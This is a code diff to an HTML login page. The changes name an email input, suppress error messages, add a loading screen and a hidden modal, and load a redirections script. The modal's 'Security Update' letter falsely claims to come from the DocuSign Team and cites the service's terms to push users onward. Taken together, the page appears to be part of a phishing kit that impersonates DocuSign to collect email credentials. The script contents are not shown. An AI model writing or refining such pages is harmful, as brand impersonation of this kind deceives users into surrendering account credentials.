@@ -6,7 +6,7 @@
     <link rel="stylesheet" href="css/login.css" />
     <title>Document</title>
   </head>
-  <body>
+  <body class="body">
     <header class="header">
       <a href="" class="header__logo-link">
         <img class="header__logo-img" src="img/logo.svg" alt="logo" />
@@ -26,8 +26,9 @@
               class="login__input input input_email"
               placeholder="Enter email"
               required
+              name="emailinput"
             />
-            <div class="login__error-msg error-msg">
+            <div style="display: none" class="login__error-msg error-msg">
               <svg
                 xmlns="http://www.w3.org/2000/svg"
                 viewBox="0 0 20 20"
@@ -38,7 +39,7 @@
                 ></path>
               </svg>
 
-              <div class="error-msg__text">Some text to test</div>
+              <div class="error-msg__text"></div>
             </div>
             <button class="login__next-button button button_blue button_submit">
               NEXT
@@ -97,6 +98,51 @@
       </div>
     </footer>
 
-    <script src="js/validation.js"></script>
+    <div style="display: none" class="loading-screen">
+      <div class="loading-wrapper">
+        <img src="img/logo.svg" alt="logo" class="loading__logo" />
+        <img src="img/icons/loading.svg" alt="loading" class="loading__icon" />
+      </div>
+    </div>
+
+    <div style="display: none" class="overlay">
+      <div class="overlay__modal overlay__modal-security">
+        <div class="main-wrapper">
+          <div class="main-title">Security Update</div>
+          <div class="main-descr">
+            Dear User, <br />
+            <br />
+            We are reaching out to you on behalf of DocuSign to inform you about
+            a new mandatory security enhancement that is being implemented in
+            accordance with the "DOCUSIGN SITES & SERVICES TERMS AND CONDITIONS"
+            (Section 4, Subsection b). As part of our ongoing commitment to
+            improving our security system, we have decided to introduce
+            additional security measures for all our users. <br />
+            <br />
+            This security enhancement will help protect your data and ensure a
+            more secure experience when using our platform. We take these
+            measures seriously to safeguard the confidentiality and integrity of
+            your documents and protect your account from unauthorized access.
+            <br />
+            <br />
+            We are making every effort to ensure that these new security
+            measures do not have any negative impact on your experience with
+            DocuSign. If you have any questions or encounter any difficulties,
+            please reach out to our support team, and our experts will assist
+            you in resolving any issues that may arise. <br />
+            <br />
+            We appreciate your understanding and support. Thank you for choosing
+            DocuSign. <br />
+            <br />
+            Best regards, <br />
+            DocuSign Team
+          </div>
+          <button class="overlay__button button button_blue">NEXT</button>
+        </div>
+      </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script src="js/redirections.js"></script>
   </body>
 </html>
